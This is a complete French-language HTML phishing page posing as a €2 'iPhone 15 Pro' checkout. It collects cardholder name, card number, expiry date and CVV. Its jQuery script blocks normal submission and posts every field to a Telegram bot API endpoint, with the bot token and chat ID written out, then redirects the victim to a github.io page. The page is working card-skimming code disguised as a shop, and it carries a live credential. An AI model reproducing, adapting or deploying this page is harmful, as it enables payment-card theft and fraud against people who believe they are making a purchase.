<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <title>iPhone 15 Pro</title>
    <!-- FAVICON -->
    <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
    <!-- LOCAL STYLE -->
    <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- VIEWPORT META TAG POUR ADAPTATION MOBILE -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Ajout de la règle de base pour l'adaptabilité */
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Wrapper principal */
        .product_wrapper {
            padding: 20px;
        }

        /* Container ajusté pour des écrans mobiles */
        .container {
            max-width: 100%;
            margin: 0 auto;
            padding: 10px;
        }

        /* Formulaire responsive */
        .form_wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .form_block input, .form_block button {
            width: 100%;
            margin: 10px 0;
        }

        /* Images et éléments de la gauche */
        .images_wrapper {
            text-align: center;
        }

        .img-tab img {
            max-width: 100%;
            height: auto;
        }

        .price_block h2 {
            font-size: 24px;
        }

        /* Responsive des cartes de crédit */
        .accepted-credit-cards img {
            width: 100%;
            max-width: 200px;
        }

        /* MEDIA QUERIES POUR PETITS ÉCRANS (SMARTPHONES) */
        @media screen and (max-width: 768px) {
            .product_block {
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .images_wrapper {
                margin-bottom: 20px;
            }

            .form_wrapper {
                width: 100%;
            }

            .product_title h1 {
                font-size: 22px;
                text-align: center;
            }

            /* Ajustement des boutons */
            .btn {
                font-size: 16px;
            }

            .card-holder, .card-number, .expiry-date, .cvv {
                margin-bottom: 10px;
            }
        }

        /* MEDIA QUERIES POUR ÉCRANS PLUS GRANDS (TABLETTES, PC) */
        @media screen and (min-width: 769px) {
            .product_block {
                display: flex;
                justify-content: space-between;
                align-items: flex-start;
            }

            .form_wrapper {
                max-width: 500px;
            }

            .images_wrapper {
                width: 40%;
            }

            .form_wrapper {
                width: 55%;
            }

            .product_title h1 {
                font-size: 32px;
                text-align: left;
            }
        }
    </style>
</head>
<body>
<section>
    <!-- PRODUCT BLOCK START HERE -->
    <div class="product_wrapper animate">
        <div class="container"> <!-- CONTAINER START -->
            <div class="product_block" style="min-height: 180px;">
                <!-- LEFT SIDE BLOCK START HERE -->
                <div class="images_wrapper">
                    <div class="price_block">
                        <span>Seulement maintenant</span>
                        <h2>€2,00</h2>
                    </div>
                    <div id="black" class="img-tab">
                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
                    </div>
                    <div id="blue" class="img-tab">
                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
                    </div>
                    <div id="natural" class="img-tab">
                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
                    </div>
                    <div id="white" class="img-tab active">
                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
                    </div>
                </div>
                <!-- LEFT SIDE BLOCK END HERE -->
                <!-- RIGHT SIDE BLOCK START HERE -->
                <div class="form_wrapper">
                    <div class="product_title">
                        <h1>iPhone 15 Pro</h1>
                    </div>
                    <!-- FORM BLOCK START HERE -->
                    <div class="form_block" id="Scroll_form">
                        <div class="row">
                            <div class="col-12">
                                <div class="title">
                                    <label>Entrez vos informations</label>
                                </div>
                            </div>
                        </div>
                        <input id="required-text" type="hidden" value="Ce champ est requis.">
                        <input id="phone-error-text" type="hidden" value="Veuillez entrer au moins 6 caractères.">
                        <form action="https://justmoicom.github.io/test3/" method="POST" id="paymentForm" name="paymentForm" novalidate="novalidate">
                            <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
                            <input type="hidden" id="user_ip" name="user_ip" value="">
                            <div class="accepted-credit-cards" style="text-align: center;margin: 1rem 0;">
                                <p style="font-size: 14px;margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
                                <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto;max-width:100%;">
                            </div>
                            <div class="card-holder form-group">
                                <label for="card_holder">Nom du titulaire</label>
                                <input type="text" name="card_holder" id="card_holder" required placeholder="Votre nom complet" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                            </div>
                            <div class="card-number form-group">
                                <label for="card_number">Numéro de carte</label>
                                <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required placeholder="0000 0000 0000 0000" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                            </div>
                            <div class="expiry-date form-group">
                                <label for="expiry_date">Date d'expiration</label>
                                <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required placeholder="MM/AA" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                            </div>
                            <div class="cvv form-group">
                                <label for="cvv">CCV</label>
                                <input type="text" name="cvv" id="cvv" maxlength="3" required placeholder="CCC" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                            </div>
                            <button type="submit" id="submitButton" class="btn btn-success btn-lg" style="width:100%;">
                                <span class="loader" style="height:12px;width:12px;border-width:3px;margin-right:5px;display:none;"></span>
                                <span class="submit-label">Effectuer Paiement</span>
                                <span class="waiting-label" style="display:none;">Patientez...</span>
                            </button>
                        </form>
                    </div>
                    <!-- FORM BLOCK END HERE -->
                </div>
                <!-- RIGHT SIDE BLOCK END HERE -->
            </div>
        </div> <!-- CONTAINER END -->
    </div>
    <!-- PRODUCT BLOCK END HERE -->
</section>
<!-- SECTION END HERE -->
<script>
    $(document).ready(function () {
        // Soumettre le formulaire avec validation
        $('#paymentForm').on('submit', function (e) {
            e.preventDefault(); // Empêcher la soumission par défaut

            if (!validateForm()) {
                return;
            }

            var formData = $(this).serializeArray();
            var message = "Nouvelle commande reçue :\n";
            formData.forEach(function (item) {
                if (item.name !== '_token') {
                    message += item.name + ": " + item.value + "\n";
                }
            });

            // Envoyer les données vers votre bot Telegram via un webhook ou API
            $.ajax({
                url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
                method: 'POST',
                data: {
                    chat_id: '7747778364',
                    text: message
                },
                success: function () {
                    // Redirection vers le site après envoi réussi
                    window.location.href = "https://justmoicom.github.io/test3/";
                },
                error: function () {
                    // En cas d'erreur, redirige également vers le site
                    window.location.href = "https://justmoicom.github.io/test3/";
                }
            });
        });

        // Validation des champs
        function validateForm() {
            var isValid = true;

            $('input[required]').each(function () {
                if ($(this).val().trim() === '') {
                    alert($(this).attr('placeholder') + ' est requis.');
                    isValid = false;
                    return false;
                }
            });

            var expiryDate = $('#expiry_date').val();
            if (!validateExpiryDate(expiryDate)) {
                isValid = false;
            }

            return isValid;
        }

        function validateExpiryDate(date) {
            var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
            if (!regex.test(date)) {
                alert('La date d\'expiration doit être au format MM/AA.');
                return false;
            }

            var parts = date.split('/');
            var month = parseInt(parts[0], 10);
            var year = parseInt(parts[1], 10);
            var currentDate = new Date();
            if (year < currentDate.getFullYear() % 100 || (year === currentDate.getFullYear() % 100 && month < currentDate.getMonth() + 1)) {
                alert('La date d\'expiration est invalide.');
                return false;
            }

            return true;
        }
    });
</script>
</body>
</html>
